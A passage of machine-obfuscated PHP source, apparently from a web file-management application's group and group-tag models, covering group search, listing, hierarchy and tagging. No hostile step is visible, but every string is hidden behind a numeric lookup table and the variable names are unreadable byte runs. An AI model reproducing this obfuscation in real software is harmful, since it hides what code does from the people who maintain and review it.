$_SERVER[Ãìšã«™]; $¿ç± = array($½â›ÁúÀ[1818] => $ö¶§í½); $àÓÃõšÂ = $this->where($¿ç±)->find(); if (!$àÓÃõšÂ || $àÓÃõšÂ[$½â›ÁúÀ[498]] == 0) { return !1; } $êŸà‚‚› = $this->getInfoSimple($àÓÃõšÂ[$½â›ÁúÀ[498]]); $this->_changeChildLevel($àÓÃõšÂ, $êŸà‚‚›, !0); $this->where(array($½â›ÁúÀ[498] => $ö¶§í½))->save(array($½â›ÁúÀ[498] => $àÓÃõšÂ[$½â›ÁúÀ[498]])); Model($½â›ÁúÀ[1906])->where($¿ç±)->delete(); Model($½â›ÁúÀ[1907])->where($¿ç±)->delete(); Model($½â›ÁúÀ[826])->groupRootRemove($ö¶§í½); return $this->where($¿ç±)->delete(); } protected function groupSort($‚ÓÏëÀÑ) { $Œƒü¹óí =& $_SERVER[Ãìšã«™]; $ÌÄ´‘úª = array(); foreach ($‚ÓÏëÀÑ as $ü •àúÓ => $ëç‚‘Ô) { $ÌÄ´‘úª[] = array($Œƒü¹óí[1818], $ëç‚‘Ô, $Œƒü¹óí[1841], $ü •àúÓ + 1); } $this->saveAll($ÌÄ´‘úª); } public function listData() { $¾ğ¯À©¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¾ğ¯À©¬[$_SERVER[Ãìšã«™][364]]); return $¾ğ¯À©¬; } private function _makeOrder($ˆŸŠì† = '') { $ñ‹ÌÈù =& $_SERVER[Ãìšã«™]; $É˜ĞóÚÀ = array($ñ‹ÌÈù[1818], $ñ‹ÌÈù[32], $ñ‹ÌÈù[1807], $ñ‹ÌÈù[193]); $ÁÒš˜¡Í = array($ñ‹ÌÈù[448] => $ñ‹ÌÈù[449], $ñ‹ÌÈù[450] => $ñ‹ÌÈù[451]); $–Ò˜§óï = Input::get($ñ‹ÌÈù[455], $ñ‹ÌÈù[7], $ñ‹ÌÈù[1822], $É˜ĞóÚÀ); $ˆ‚ÃÒÂ” = Input::get($ñ‹ÌÈù[456], $ñ‹ÌÈù[7], $ñ‹ÌÈù[1908], array($ñ‹ÌÈù[1908], $ñ‹ÌÈù[450])); $ˆ‚ÃÒÂ” = $ÁÒš˜¡Í[$ˆ‚ÃÒÂ”]; $ˆŸŠì† = $ˆŸŠì† . "{$–Ò˜§óï}\x20{$ˆ‚ÃÒÂ”}\x2c\40\147\162\157\x75\160\111\104\40\141\x73\143"; return $this->order($ˆŸŠì†); } public function listChild($¤âÌ°±Ë) { $ç¡‰Æä² =& $_SERVER[Ãìšã«™]; $€¬ú«»š = $this->where(array($ç¡‰Æä²[498] => $¤âÌ°±Ë))->_makeOrder()->selectPage(200); $this->_listDataApply($€¬ú«»š[$ç¡‰Æä²[364]]); return $€¬ú«»š; } public function listByID($úÆŞ ó‘) { $şåú’ì¼ =& $_SERVER[Ãìšã«™]; if (!$úÆŞ ó‘) { return array(); } $çáİî±Ÿ = array($şåú’ì¼[1818] => array($şåú’ì¼[7], $úÆŞ ó‘)); $»²ëåÊ = $this->where($çáİî±Ÿ)->select(); $»²ëåÊ = array_sort_keep($»²ëåÊ, $şåú’ì¼[1818], $úÆŞ ó‘); $this->_listDataApply($»²ëåÊ); return $»²ëåÊ; } public function listSearch($¹ã³ÂŸÄ) { $À¬”µšû =& $_SERVER[Ãìšã«™]; $˜œ˜½œÛ = $¹ã³ÂŸÄ[$À¬”µšû[1909]]; $²®¶ú²Ç = isset($¹ã³ÂŸÄ[$À¬”µšû[1910]]) ? $¹ã³ÂŸÄ[$À¬”µšû[1910]] : !1; if (!trim($˜œ˜½œÛ)) { return !1; } $˜œ˜½œÛ = str_replace($À¬”µšû[1911], $À¬”µšû[1912], $˜œ˜½œÛ); $‘»ÖŞ = array($À¬”µšû[1818] => array($À¬”µšû[378], "{$˜œ˜½œÛ}\45"), $À¬”µšû[32] => array($À¬”µšû[378], "\45{$˜œ˜½œÛ}\45"), $À¬”µšû[996] => $À¬”µšû[1913]); if ($²®¶ú²Ç) { $°Û…Í«Š = $this->getInfoSimple($²®¶ú²Ç); $¼øÁŞàü = $°Û…Í«Š[$À¬”µšû[521]] . $²®¶ú²Ç . $À¬”µšû[545]; $‘»ÖŞ = array($‘»ÖŞ, array($À¬”µšû[521] => array($À¬”µšû[378], $¼øÁŞàü))); } $‘»ÖŞ = $this->parseWhereLike($‘»ÖŞ); $€æ¿”©û = $this->_makeOrder()->where($‘»ÖŞ)->selectPage(20); $€æ¿”©û = $€æ¿”©û ? $€æ¿”©û : array($À¬”µšû[364] => array(), $À¬”µšû[361] => array()); if (!$€æ¿”©û || count($€æ¿”©û[$À¬”µšû[364]]) < 5 && Input::check($˜œ˜½œÛ, $À¬”µšû[313])) { $ÊÁğ¨ñÉ = $this->groupChildrenAll($²®¶ú²Ç); $”¬üÌñ¿ = $this->_searchFromMeta($À¬”µšû[463], $˜œ˜½œÛ, 10, $ÊÁğ¨ñÉ); $ìÀ£úŸë = $this->_searchFromMeta($À¬”µšû[464], $˜œ˜½œÛ, 10, $ÊÁğ¨ñÉ); $ñÆæĞïõ = array_merge($”¬üÌñ¿, $ìÀ£úŸë, $€æ¿”©û[$À¬”µšû[364]]); $€æ¿”©û[$À¬”µšû[364]] = array_unique_by_key($ñÆæĞïõ, $À¬”µšû[1818]); $€æ¿”©û[$À¬”µšû[361]][$À¬”µšû[362]] = count($€æ¿”©û[$À¬”µšû[364]]); $€æ¿”©û[$À¬”µšû[361]][$À¬”µšû[363]] = ceil($€æ¿”©û[$À¬”µšû[361]][$À¬”µšû[362]] / $€æ¿”©û[$À¬”µšû[361]][$À¬”µšû[358]]); } $this->_listDataApply($€æ¿”©û[$À¬”µšû[364]]); return $€æ¿”©û; } protected function groupChildrenAll($Ì¡Ê·Ü×) { $Ş¿£‘ =& $_SERVER[Ãìšã«™]; if (!$Ì¡Ê·Ü×) { return !1; } if (is_string($Ì¡Ê·Ü×)) { $Ì¡Ê·Ü× = array($Ì¡Ê·Ü×); } $µæ»¼ô = $Ì¡Ê·Ü×; foreach ($Ì¡Ê·Ü× as $®ä©æó«) { $Œáé¤‰œ = $this->getInfoSimple($®ä©æó«); $»íŸ³’ú = array($Ş¿£‘[521] => array($Ş¿£‘[378], $Œáé¤‰œ[$Ş¿£‘[521]] . $®ä©æó« . $Ş¿£‘[545])); $ó„Äêšê = $this->field($Ş¿£‘[1818])->where($»íŸ³’ú)->select(); $µæ»¼ô = array_merge($µæ»¼ô, array_to_keyvalue($ó„Äêšê, $Ş¿£‘[12], $Ş¿£‘[1818])); } return array_unique($µæ»¼ô); } private function _searchFromMeta($ã•ÖÛã, $Üƒ‹É½÷, $Æ³ÊÜƒ´, $¦¶´»è) { $¾ö°¿ş =& $_SERVER[Ãìšã«™]; $Üƒ‹É½÷ = strtolower($Üƒ‹É½÷); $†Ø¼ºîÑ = array($¾ö°¿ş[95] => $ã•ÖÛã, $¾ö°¿ş[369] => array($¾ö°¿ş[378], "\x25{$Üƒ‹É½÷}\45")); $†Ø¼ºîÑ = $this->parseWhereLike($†Ø¼ºîÑ); if ($¦¶´»è) { $†Ø¼ºîÑ[$¾ö°¿ş[1818]] = array($¾ö°¿ş[7], $¦¶´»è); } $¹ˆ¿ğì” = Model($¾ö°¿ş[1914])->where($†Ø¼ºîÑ)->limit($Æ³ÊÜƒ´)->select(); if (!$¹ˆ¿ğì”) { return array(); } $¹ˆ¿ğì” = array_to_keyvalue($¹ˆ¿ğì”, $¾ö°¿ş[12], $¾ö°¿ş[1818]); $¢‡îå‘Ø = $this->where(array($¾ö°¿ş[1905] => array($¾ö°¿ş[7], $¹ˆ¿ğì”)))->select(); if (!$¢‡îå‘Ø) { return array(); } return $¢‡îå‘Ø; } protected function _listDataApplyItem($İ¿¶é·‘) { $€àşğÀš = array($İ¿¶é·‘); $this->_listDataApply($€àşğÀš); return $€àşğÀš[0]; } protected function _listDataApply(&$¥ïÔ¹‚×) { $í¼£ŸıÈ =& $_SERVER[Ãìšã«™]; if (!$¥ïÔ¹‚×) { return; } $ÖüŞËö± = array_to_keyvalue($¥ïÔ¹‚×, $í¼£ŸıÈ[12], $í¼£ŸıÈ[1818]); $this->_listAppendChildren($¥ïÔ¹‚×); $this->_listAppendChildrenMember($¥ïÔ¹‚×); $this->_listAppendMeta($¥ïÔ¹‚×, $ÖüŞËö±); $this->_listAppendParent($¥ïÔ¹‚×); $this->_listAppendSourceRoot($¥ïÔ¹‚×, $ÖüŞËö±); } private function _listAppendChildren(&$àÚÄ) { $¿™Ôş¹Ü =& $_SERVER[Ãìšã«™]; $ÁÓŒàÂõ = array_to_keyvalue($àÚÄ, $¿™Ôş¹Ü[12], $¿™Ôş¹Ü[1818]); $­ê„– = array($¿™Ôş¹Ü[498] => array($¿™Ôş¹Ü[7], $ÁÓŒàÂõ)); $×ÛÃòÙÛ = array($¿™Ôş¹Ü[498], $¿™Ôş¹Ü[1915] => $¿™Ôş¹Ü[500]); $ °ºûÏ§ = $this->field($×ÛÃòÙÛ)->where($­ê„–)->group($¿™Ôş¹Ü[498])->select(); $Øµ¸ÜŸ = array_to_keyvalue($ °ºûÏ§, $¿™Ôş¹Ü[498], $¿™Ôş¹Ü[500]); foreach ($àÚÄ as &$ºªºĞÌ¡) { $ø•¦Äîù = $ºªºĞÌ¡[$¿™Ôş¹Ü[1818]]; $ºªºĞÌ¡[$¿™Ôş¹Ü[1916]] = isset($Øµ¸ÜŸ[$ø•¦Äîù]) ? intval($Øµ¸ÜŸ[$ø•¦Äîù]) : !1; } unset($ºªºĞÌ¡); } private function _listAppendChildrenMember(&$˜‰Ù„€ƒ) { $­¢ÏäôÌ =& $_SERVER[Ãìšã«™]; $ÔÙê’Ü = array_to_keyvalue($˜‰Ù„€ƒ, $­¢ÏäôÌ[12], $­¢ÏäôÌ[1818]); $ƒª®¦Å = array($­¢ÏäôÌ[1818] => array($­¢ÏäôÌ[7], $ÔÙê’Ü)); $ñ±¬Üœş = array($­¢ÏäôÌ[1818], $­¢ÏäôÌ[1915] => $­¢ÏäôÌ[500]); $°Éğ¦éÃ = Model($­¢ÏäôÌ[1907])->field($ñ±¬Üœş)->where($ƒª®¦Å)->group($­¢ÏäôÌ[1818])->select(); $ú’¿Ò¹Ğ = array_to_keyvalue($°Éğ¦éÃ, $­¢ÏäôÌ[1818], $­¢ÏäôÌ[500]); foreach ($˜‰Ù„€ƒ as &$„«È™­å) { $“Ãàìá¿ = $„«È™­å[$­¢ÏäôÌ[1818]]; $„«È™­å[$­¢ÏäôÌ[1917]] = isset($ú’¿Ò¹Ğ[$“Ãàìá¿]) ? intval($ú’¿Ò¹Ğ[$“Ãàìá¿]) : !1; } unset($„«È™­å); } private function _listAppendMeta(&$®ßËÌéÎ, $İäÂÚ®ç) { $ºË¿üùÛ =& $_SERVER[Ãìšã«™]; $×ä„óİ = array($ºË¿üùÛ[1818] => array($ºË¿üùÛ[7], $İäÂÚ®ç)); $¿áº“èÈ = Model($ºË¿üùÛ[1906])->where($×ä„óİ)->select(); $¿áº“èÈ = array_to_keyvalue_group($¿áº“èÈ, $ºË¿üùÛ[1818]); foreach ($¿áº“èÈ as &$ú±øöÉ ) { $ú±øöÉ  = array_to_keyvalue($ú±øöÉ , $ºË¿üùÛ[95], $ºË¿üùÛ[369]); } unset($ú±øöÉ ); foreach ($®ßËÌéÎ as &$Şã¹°§) { $Şã¹°§[$ºË¿üùÛ[465]] = array(); if (isset($¿áº“èÈ[$Şã¹°§[$ºË¿üùÛ[1818]]])) { $Şã¹°§[$ºË¿üùÛ[465]] = $¿áº“èÈ[$Şã¹°§[$ºË¿üùÛ[1818]]]; } } unset($Şã¹°§); } protected function parentLevelArray($ÅûŒº€–) { $¤èà½ºò =& $_SERVER[Ãìšã«™]; $ÅûŒº€– = explode($¤èà½ºò[50], trim($ÅûŒº€–, $¤èà½ºò[50])); $ÅûŒº€– = array_remove_value($ÅûŒº€–, $¤èà½ºò[190]); return $ÅûŒº€–; } private function _listAppendParent(&$ğòâìŒ˜) { $Ë ›üÖˆ =& $_SERVER[Ãìšã«™]; $×Ÿéö—” = array(); foreach ($ğòâìŒ˜ as &$ßŸàµ¨—) { $×Ÿéö—”[$ßŸàµ¨—[$Ë ›üÖˆ[1818]]] = $ßŸàµ¨—[$Ë ›üÖˆ[32]]; $ßÕÙÏø = $this->parentLevelArray($ßŸàµ¨—[$Ë ›üÖˆ[521]]); foreach ($ßÕÙÏø as $ÍÛ…’Ì¿) { if (!isset($×Ÿéö—”[$ÍÛ…’Ì¿])) { $×Ÿéö—”[$ÍÛ…’Ì¿] = 0; } } } unset($ßŸàµ¨—); foreach ($×Ÿéö—” as $Ùèèè©î => $™áñ‚ÊÓ) { if ($™áñ‚ÊÓ) { continue; } $ä×­¨± = $this->getInfoSimple($Ùèèè©î); $×Ÿéö—”[$Ùèèè©î] = $ä×­¨±[$Ë ›üÖˆ[32]]; } $üÉ“¬Š = $GLOBALS[$Ë ›üÖˆ[6]][$Ë ›üÖˆ[90]][$Ë ›üÖˆ[1918]]; if ($GLOBALS[$Ë ›üÖˆ[505]] == $Ë ›üÖˆ[89]) { $üÉ“¬Š = !1; } foreach ($ğòâìŒ˜ as &$ßŸàµ¨—) { $ßÕÙÏø = $this->parentLevelArray($ßŸàµ¨—[$Ë ›üÖˆ[521]]); $ñ½ñÃ³ = $Ë ›üÖˆ[12]; foreach ($ßÕÙÏø as $Ùèèè©î => $ÍÛ…’Ì¿) { if ($üÉ“¬Š && $Ùèèè©î == 0) { continue; } $ñ½ñÃ³ .= $×Ÿéö—”[$ÍÛ…’Ì¿] . $Ë ›üÖˆ[8]; } if ($ßÕÙÏø) { $ñ½ñÃ³ .= $ßŸàµ¨—[$Ë ›üÖˆ[32]]; } $ßŸàµ¨—[$Ë ›üÖˆ[526]] = str_replace($Ë ›üÖˆ[529], $Ë ›üÖˆ[8], $ñ½ñÃ³); } unset($ßŸàµ¨—); } private function _listAppendSourceRoot(&$³”‰§£ä, $‹æ±†¹) { $µåæÍô =& $_SERVER[Ãìšã«™]; $—îÈ˜º› = Model($µåæÍô[826])->listSourceRoot(SourceModel::TYPE_GROUP, $‹æ±†¹); $—îÈ˜º› = array_to_keyvalue($—îÈ˜º›, $µåæÍô[504]); $—îÈ˜º› = array_remove_key($—îÈ˜º›, $µåæÍô[504]); foreach ($³”‰§£ä as &$ÅÛ„ĞÏù) { $ÅÛ„ĞÏù[$µåæÍô[87]] = $—îÈ˜º›[$ÅÛ„ĞÏù[$µåæÍô[1818]]] ? $—îÈ˜º›[$ÅÛ„ĞÏù[$µåæÍô[1818]]] : array(); } unset($ÅÛ„ĞÏù); } protected function groupMerge($ù¬êÖıŒ) { $ù¬êÖıŒ = array_values(array_unique($ù¬êÖıŒ)); $Íşå¥‰¥ = array(); for ($‡Ñ¢Ã÷ = 0; $‡Ñ¢Ã÷ < count($ù¬êÖıŒ); $‡Ñ¢Ã÷++) { $ŒÆ“ÊƒÏ = !1; for ($Ø˜°Ë¸ƒ = 0; $Ø˜°Ë¸ƒ < count($ù¬êÖıŒ); $Ø˜°Ë¸ƒ++) { if ($‡Ñ¢Ã÷ == $Ø˜°Ë¸ƒ) { continue; } if ($this->isParentOf($ù¬êÖıŒ[$Ø˜°Ë¸ƒ], $ù¬êÖıŒ[$‡Ñ¢Ã÷])) { $ŒÆ“ÊƒÏ = !0; break; } } if (!$ŒÆ“ÊƒÏ) { $Íşå¥‰¥[] = $ù¬êÖıŒ[$‡Ñ¢Ã÷]; } } return $Íşå¥‰¥; } protected function isParentOf($è¯Óº÷í, $ÑøŸñš©) { $Ø©­üÍü =& $_SERVER[Ãìšã«™]; if (!$è¯Óº÷í || !$ÑøŸñš© || $è¯Óº÷í == $ÑøŸñš©) { return !1; } $ï¿Èºù = $this->getInfoSimple($è¯Óº÷í); $ÁÖìçÜÌ = $this->getInfoSimple($ÑøŸñš©); $Á«¸Úƒ = $ï¿Èºù[$Ø©­üÍü[521]] . $è¯Óº÷í . $Ø©­üÍü[50]; if (substr($ÁÖìçÜÌ[$Ø©­üÍü[521]], 0, strlen($Á«¸Úƒ)) == $Á«¸Úƒ) { return !0; } return !1; } public function groupShowRoot($Ğ›ìƒ“ó, $ö°‡œ¦Ü = false) { $ŞŒãÄ”÷ =& $_SERVER[Ãìšã«™]; $Ÿâàê·œ = $this->getInfo($Ğ›ìƒ“ó); if (!$Ÿâàê·œ) { return array(); } $ø¥Ù®§ = $this->parentLevelArray($Ÿâàê·œ[$ŞŒãÄ”÷[521]]); $¨À«£«ª = array($Ğ›ìƒ“ó); if (count($ø¥Ù®§) == 0) { return $¨À«£«ª; } if ($ö°‡œ¦Ü && count($ø¥Ù®§) == 1) { return $¨À«£«ª; } if (!$Ÿâàê·œ[$ŞŒãÄ”÷[465]] || !isset($Ÿâàê·œ[$ŞŒãÄ”÷[465]][$ŞŒãÄ”÷[1903]]) || $Ÿâàê·œ[$ŞŒãÄ”÷[465]][$ŞŒãÄ”÷[1903]] == $ŞŒãÄ”÷[1872]) { return $this->groupShowRoot($ø¥Ù®§[count($ø¥Ù®§) - 1], $ö°‡œ¦Ü); } if ($Ÿâàê·œ[$ŞŒãÄ”÷[465]][$ŞŒãÄ”÷[1903]] == $ŞŒãÄ”÷[352]) { $ÛïêÆ»— = explode($ŞŒãÄ”÷[50], $Ÿâàê·œ[$ŞŒãÄ”÷[465]][$ŞŒãÄ”÷[1904]]); if ($ÛïêÆ»—) { $¨À«£«ª = array_merge($¨À«£«ª, $ÛïêÆ»—); } } return $¨À«£«ª; } protected function resetParentLevel() { $šŒ÷ÅªÒ =& $_SERVER[Ãìšã«™]; $»Şƒªãœ = $šŒ÷ÅªÒ[1818]; $¹Û¹š°Ç = $this->select(); $¹Û¹š°Ç = array_to_keyvalue($¹Û¹š°Ç, $»Şƒªãœ); foreach ($¹Û¹š°Ç as $ìˆÜÃÀŒ) { $åå×™› = $ìˆÜÃÀŒ; $›î¨Ğ„‹ = array(); while ($åå×™›[$šŒ÷ÅªÒ[498]] != 0) { $›î¨Ğ„‹[] = $åå×™›[$šŒ÷ÅªÒ[498]]; $åå×™› = $¹Û¹š°Ç[$åå×™›[$šŒ÷ÅªÒ[498]]]; } $›î¨Ğ„‹[] = 0; $›î¨Ğ„‹ = $šŒ÷ÅªÒ[50] . implode($šŒ÷ÅªÒ[50], array_reverse($›î¨Ğ„‹)) . $šŒ÷ÅªÒ[50]; $this->setNamePinyin($ìˆÜÃÀŒ[$»Şƒªãœ], $ìˆÜÃÀŒ[$šŒ÷ÅªÒ[32]]); $this->where(array($»Şƒªãœ => $ìˆÜÃÀŒ[$»Şƒªãœ]))->save(array($šŒ÷ÅªÒ[584] => $›î¨Ğ„‹)); } return $¹Û¹š°Ç; } public function groupNameAuto($Ë“’™êô, $öŸıåÁÕ) { $Ì¾Üò˜Ä =& $_SERVER[Ãìšã«™]; $ïàáÃåÓ = $this->where(array($Ì¾Üò˜Ä[402] => $Ë“’™êô))->getField($Ì¾Üò˜Ä[32], !0); if (!$ïàáÃåÓ || !in_array($öŸıåÁÕ, $ïàáÃåÓ)) { return $öŸıåÁÕ; } for ($”İ‹È¹ = 1; $”İ‹È¹ <= count($ïàáÃåÓ) + 1; $”İ‹È¹++) { $Ÿô¼ŸÏû = $öŸıåÁÕ . "\50{$”İ‹È¹}\x29"; if (!in_array($Ÿô¼ŸÏû, $ïàáÃåÓ)) { return $Ÿô¼ŸÏû; } } } public function groupSwitch($Àœğ®ïÅ, $·ÑÉŸâ) { $Â¼¡¢èƒ =& $_SERVER[Ãìšã«™]; $Â‰šºà = array($Â¼¡¢èƒ[1818] => array($Â¼¡¢èƒ[7], array($Àœğ®ïÅ, $·ÑÉŸâ))); $Õ Ê°ïØ = $this->where($Â‰šºà)->select(); $Õ Ê°ïØ = array_to_keyvalue($Õ Ê°ïØ, $Â¼¡¢èƒ[1818]); if (!isset($Õ Ê°ïØ[$Àœğ®ïÅ]) || !isset($Õ Ê°ïØ[$·ÑÉŸâ]) || $Õ Ê°ïØ[$Àœğ®ïÅ][$Â¼¡¢èƒ[498]] == 0) { return !1; } $Â‰šºà = array($Â¼¡¢èƒ[1818] => $Àœğ®ïÅ); $˜æğÔ¥ = Model($Â¼¡¢èƒ[1907])->where($Â‰šºà)->select(); if (!$˜æğÔ¥) { $˜æğÔ¥ = array(); } foreach ($˜æğÔ¥ as $¿Ÿâ‘¬) { $³”“—¢« = $¿Ÿâ‘¬[$Â¼¡¢èƒ[1650]]; $Â‰šºà = array($Â¼¡¢èƒ[1650] => $³”“—¢«, $Â¼¡¢èƒ[1818] => $·ÑÉŸâ); $ Ûúå÷ò = Model($Â¼¡¢èƒ[1907])->where($Â‰šºà)->find(); if (!$ Ûúå÷ò) { $É´¤Õ‡ = array($·ÑÉŸâ => $¿Ÿâ‘¬[$Â¼¡¢èƒ[1919]]); Model($Â¼¡¢èƒ[538])->userGroupAdd($³”“—¢«, $É´¤Õ‡); } Model($Â¼¡¢èƒ[538])->userGroupRemove($³”“—¢«, $Àœğ®ïÅ); } $Â‰šºà = array($Â¼¡¢èƒ[412] => 2, $Â¼¡¢èƒ[498] => 0, $Â¼¡¢èƒ[411] => 1, $Â¼¡¢èƒ[504] => array($Â¼¡¢èƒ[7], array($Àœğ®ïÅ, $·ÑÉŸâ))); $õµ¾Í±º = Model($Â¼¡¢èƒ[826])->where($Â‰šºà)->field($Â¼¡¢èƒ[1920])->select(); $õµ¾Í±º = array_to_keyvalue($õµ¾Í±º, $Â¼¡¢èƒ[504], $Â¼¡¢èƒ[403]); $²ş×êâ = !empty($õµ¾Í±º[$Àœğ®ïÅ]) ? $õµ¾Í±º[$Àœğ®ïÅ] : !1; if ($²ş×êâ) { if (!$õµ¾Í±º[$·ÑÉŸâ]) { $õµ¾Í±º[$·ÑÉŸâ] = Model($Â¼¡¢èƒ[826])->groupRootAdd($·ÑÉŸâ); } $ı‹ƒ‰Ú = $õµ¾Í±º[$·ÑÉŸâ]; $Â‰šºà = array($Â¼¡¢èƒ[498] => $²ş×êâ); $õµ¾Í±º = Model($Â¼¡¢èƒ[826])->where($Â‰šºà)->field($Â¼¡¢èƒ[1921])->select(); if (!$õµ¾Í±º) { $õµ¾Í±º = array(); } Model($Â¼¡¢èƒ[826])->moveClearAuth = !1; foreach ($õµ¾Í±º as $ğÁºÜ) { $¢Õšğ¢ = $ğÁºÜ[$Â¼¡¢èƒ[411]] == $Â¼¡¢èƒ[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Â¼¡¢èƒ[826])->move($ğÁºÜ[$Â¼¡¢èƒ[403]], $ı‹ƒ‰Ú, $¢Õšğ¢); } Model($Â¼¡¢èƒ[826])->moveClearAuth = !0; $Â‰šºà = array($Â¼¡¢èƒ[412] => 2, $Â¼¡¢èƒ[504] => $Àœğ®ïÅ); $©¢ğöÙ¾ = array($Â¼¡¢èƒ[504] => $·ÑÉŸâ); Model($Â¼¡¢èƒ[1922])->where($Â‰šºà)->save($©¢ğöÙ¾); Model($Â¼¡¢èƒ[1923])->where($Â‰šºà)->save($©¢ğöÙ¾); } $this->_changeChildLevel($Õ Ê°ïØ[$Àœğ®ïÅ], $Õ Ê°ïØ[$·ÑÉŸâ], !0); $this->where(array($Â¼¡¢èƒ[498] => $Àœğ®ïÅ))->save(array($Â¼¡¢èƒ[498] => $·ÑÉŸâ)); $this->_clearChildrenCache($Õ Ê°ïØ[$·ÑÉŸâ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($şÖüÅ¥Ê) { $˜œúÈˆÒ =& $_SERVER[Ãìšã«™]; return array($˜œúÈˆÒ[1924] => array($şÖüÅ¥Ê[0], $˜œúÈˆÒ[1925]), $˜œúÈˆÒ[1926] => array($şÖüÅ¥Ê[0], $˜œúÈˆÒ[1927])); } protected function get($¤‡¬ÜÊ³) { $…À™¶ =& $_SERVER[Ãìšã«™]; $İ·š÷´ = Model($…À™¶[522])->metaGet($¤‡¬ÜÊ³, $…À™¶[1928]); $£©ŠÇ¼ô = json_decode($İ·š÷´, !0); return $£©ŠÇ¼ô ? $£©ŠÇ¼ô : array($…À™¶[1929] => $…À™¶[89], $…À™¶[364] => array()); } protected function set($õ³®È“Ò, $Ú™ĞÅ±Ô) { $İšªÛÙâ =& $_SERVER[Ãìšã«™]; $Ú™ĞÅ±Ô = $Ú™ĞÅ±Ô ? $Ú™ĞÅ±Ô : array($İšªÛÙâ[1929] => $İšªÛÙâ[89], $İšªÛÙâ[364] => array()); Model($İšªÛÙâ[522])->metaSet($õ³®È“Ò, $İšªÛÙâ[1928], json_encode($Ú™ĞÅ±Ô)); return Model($İšªÛÙâ[522])->metaSet($õ³®È“Ò, $İšªÛÙâ[1928], json_encode($Ú™ĞÅ±Ô)); } protected function getByTagID($…ï‹ìê®, $¡ÚÎ¸Î´) { $áÈÎ›¶» =& $_SERVER[Ãìšã«™]; if (!$…ï‹ìê® || !$¡ÚÎ¸Î´) { return !1; } if (!Model($áÈÎ›¶»[522])->getInfoSimple($…ï‹ìê®)) { return !1; } $ìÑéÁƒ = $this->get($…ï‹ìê®); if (!$ìÑéÁƒ || !isset($ìÑéÁƒ[$áÈÎ›¶»[364]])) { return !1; } $¶Ÿ÷…ó¹ = array_find_by_field($ìÑéÁƒ[$áÈÎ›¶»[364]], $áÈÎ›¶»[392], $¡ÚÎ¸Î´); return is_array($¶Ÿ÷…ó¹) ? $¶Ÿ÷…ó¹ : !1; } public function listSource($û¯£¡¸, $ÉİğŸêü) { $¤×„ÒÔ¨ =& $_SERVER[Ãìšã«™]; if ($ÉİğŸêü && !is_array($ÉİğŸêü)) { $ÉİğŸêü = array($ÉİğŸêü); } $ã”Š²´À = $this->listData($û¯£¡¸); $òî•ˆ = array(); foreach ($ã”Š²´À as $‚œ‡úë) { $»¿ëô„Ô = $‚œ‡úë[$¤×„ÒÔ¨[78]]; if (!$»¿ëô„Ô) { continue; } if (!isset($òî•ˆ[$»¿ëô„Ô])) { $òî•ˆ[$»¿ëô„Ô] = array(); } $òî•ˆ[$»¿ëô„Ô][] = $‚œ‡úë[$¤×„ÒÔ¨[427]]; } $şª´©·€ = array(); foreach ($òî•ˆ as $ƒ©ÅÉ™ => $ª¶â¤ªÉ) { $÷éäù©¾ = !0; if (!$ÉİğŸêü) { $şª´©·€[] = $ƒ©ÅÉ™; continue; } foreach ($ÉİğŸêü as $™ßÜˆÄ) { if (!in_array($™ßÜˆÄ, $ª¶â¤ªÉ)) { $÷éäù©¾ = !1; break; } } if ($÷éäù©¾) { $şª´©·€[] = $ƒ©ÅÉ™; } } if (!$şª´©·€) { return array(); } $«ˆ„Ô‹ = array($¤×„ÒÔ¨[418] => array($¤×„ÒÔ¨[419], $şª´©·€), $¤×„ÒÔ¨[504] => $û¯£¡¸, $¤×„ÒÔ¨[412] => SourceModel::TYPE_GROUP); $·Ø£ó­ = Model($¤×„ÒÔ¨[1321])->listSource($«ˆ„Ô‹); if (!$·Ø£ó­ || count($şª´©·€) == $·Ø£ó­[$¤×„ÒÔ¨[361]][$¤×„ÒÔ¨[362]]) { return $·Ø£ó­; } $ØñŸÒÎ‡ = array(); $¶ØÎø£Û = array_to_keyvalue($·Ø£ó­[$¤×„ÒÔ¨[77]], $¤×„ÒÔ¨[12], $¤×„ÒÔ¨[403]); $¼ğŞËÇÒ = array_to_keyvalue($·Ø£ó­[$¤×„ÒÔ¨[76]], $¤×„ÒÔ¨[12], $¤×„ÒÔ¨[403]); $£ùÂ«¿Ì = array_merge($¼ğŞËÇÒ, $¶ØÎø£Û); foreach ($şª´©·€ as $»¿ëô„Ô) { if (!in_array($»¿ëô„Ô, $£ùÂ«¿Ì)) { $ØñŸÒÎ‡[] = $»¿ëô„Ô; } } if ($ØñŸÒÎ‡) { $this->removeBySource($û¯£¡¸, $ØñŸÒÎ‡); } return $·Ø£ó­; } protected function listData($İİ­å±Å) { $ŞæÕ¢…Á =& $_SERVER[Ãìšã«™]; $¤ˆ¬¹´ö = array($ŞæÕ¢…Á[1641] => 0, $ŞæÕ¢…Á[483] => array($ŞæÕ¢…Á[1930], 0), $ŞæÕ¢…Á[423] => $ŞæÕ¢…Á[1931] . $İİ­å±Å); $öÏí£­ = $ŞæÕ¢…Á[1932]; $ã ¹³’× = $this->field($öÏí£­)->where($¤ˆ¬¹´ö)->order($ŞæÕ¢…Á[1933])->select(); return $ã ¹³’× ? $ã ¹³’× : array(); } protected function addToTag($ãÎÈ‚, $œªìËùğ, $Ä²©«û) { $ƒŒŒİÖ =& $_SERVER[Ãìšã«™]; if (!$this->getByTagID($ãÎÈ‚, $Ä²©«û) || !$œªìËùğ) { return !1; } if (!Model($ƒŒŒİÖ[826])->pathInfo($œªìËùğ)) { return !1; } $÷ØÃÛÒ = array($ƒŒŒİÖ[1641] => 0, $ƒŒŒİÖ[483] => $Ä²©«û, $ƒŒŒİÖ[422] => $œªìËùğ, $ƒŒŒİÖ[423] => $ƒŒŒİÖ[1934] . $ãÎÈ‚, $ƒŒŒİÖ[421] => $ƒŒŒİÖ[12], $ƒŒŒİÖ[1822] => 0); if ($this->where($÷ØÃÛÒ)->find()) { return !1; } return $this->add($÷ØÃÛÒ); } protected function removeFromTag($äĞĞ±äá, $¦Õ…ƒöÊ, $ƒ›ëæÖ¢) { $¹¹¾€§€ =& $_SERVER[Ãìšã«™]; if (!$this->getByTagID($äĞĞ±äá, $ƒ›ëæÖ¢) || !$¦Õ…ƒöÊ) { return !1; } if (is_array($¦Õ…ƒöÊ)) { $¦Õ…ƒöÊ = array($¹¹¾€§€[7], $¦Õ…ƒöÊ); } $á÷‘¥öç = array($¹¹¾€§€[1641] => 0, 